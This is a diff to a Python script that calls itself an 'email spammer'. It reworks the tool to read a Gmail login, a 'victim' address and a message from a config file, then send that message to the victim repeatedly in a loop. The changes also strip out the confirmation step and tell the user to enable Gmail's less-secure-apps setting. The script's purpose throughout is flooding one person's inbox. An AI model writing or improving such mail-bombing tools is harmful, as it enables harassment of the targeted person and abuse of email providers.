@@ -1,11 +1,14 @@
-import os, sys, time, smtplib
+import os, json, smtplib
 
 os.system('cls & mode 70, 12 & title email spammer │ by lozza (github.com/qro)')
-email = input('\n [?] Email: ')
-password = input(' [?] Password: ')
-victim = input(' [?] Victim: ')
-message = input(' [?] Message: ')
-number = input(' [?] Amount: ')
+
+with open('config.json') as f:
+    config = json.load(f)
+email = config.get('email')
+password = config.get('password')
+victim = config.get('victim')
+message = config.get('message')
+number = int(input('\n [?] Number of times: '))
 
 class SMTP():
     def __init__(self):
@@ -14,9 +17,8 @@ class SMTP():
         self.victim = victim
         self.message = message
         self.number = number
-
+    
     def verify(self):
-
         server1 = smtplib.SMTP('smtp.gmail.com', 587)
         server1.ehlo()
         server1.starttls()
@@ -24,35 +26,10 @@ class SMTP():
         try:
             server1.login(self.email, self.password)
         except smtplib.SMTPAuthenticationError:
-            print('\n [!] The email or password is wrong')
-            time.sleep(2)
-            exit()
-
-        SMTP().main()
-
-    def main(self):
-        if len(sys.argv) < 2:
-            os.system('cls')
-            sys.stdout.write(f'''
-            
-        [!] Connected as: {self.email}
-        [!] Victim: {self.victim}
-        [!] Message: {self.message}  
-        [!] Amount: {self.number}
-        
-        ''')
-
-        option = input('\n [?] Spam email? [y/n]: ')
-        if option == 'y':
-            SMTP().spam()
-            os.system('python main.py')
-        if option == 'n':
-            os.system('python main.py')
-        else:
-            print('\n [!] Invalid option')
-            time.sleep(0.5)
-            SMTP().main()
-        
+            print('\n [!] The email or password is wrong\n [!] Make sure lesssecureapps is turned on') # https://myaccount.google.com/lesssecureapps
+            input()
+        SMTP().spam()
+    
     def spam(self):
         os.system('cls & mode 70, 32 & title email spammer │ by lozza (github.com/qro)')
         server2 = smtplib.SMTP('smtp.gmail.com', 587)
@@ -63,13 +40,9 @@ class SMTP():
         while i < self.number:
             i+=1
             server2.sendmail(self.email, self.victim, self.message)
-            if i == 1: 
-                print((' [>] ''%d Email sent ')%(i))
-            else:
-                print((' [>] ''%d Emails sent ')%(i))
-            sys.stdout.flush()
+            print((' [>] ''%d sent ')%(i))
         print('\n [!] Process finished')
-        time.sleep(3)
-            
+        input()
+
 if __name__ == '__main__':
     SMTP().verify()
